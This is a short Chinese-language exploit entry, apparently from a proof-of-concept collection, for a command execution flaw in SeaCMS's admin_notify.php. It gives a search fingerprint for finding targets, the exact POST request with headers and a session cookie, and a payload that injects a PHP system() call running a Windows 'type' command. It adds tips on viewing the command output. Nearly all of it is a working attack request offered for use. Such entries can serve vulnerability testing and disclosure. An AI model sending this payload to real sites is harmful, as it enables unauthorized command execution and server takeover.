# 海洋CMSadmin_notify.php远程代码执行漏洞

- **系统**：海洋CMSadmin_notify.php远程　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="http://www.seacms.net"`
- **请求**：`POST /SeaCMS_12.9/Upload/pwh4pc/admin_notify.php?action=set HTTP/1.1`
- **关键头**：`Priority: u=1`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: PHPSESSID=8h9dt1md0b4ppcvdrjn64kfsum`

**请求体 / payload**
```
notify1=1";system("type C:\Windows\win.ini");;//&notify2=2&notify3=3
后台漏洞，有后台权限的可以打， 执行后会有一个保存设置的过程然后页面跳转，需再次请求页面，查看命令执行结果，也可以使用浏览器插件一步到位，如下：
```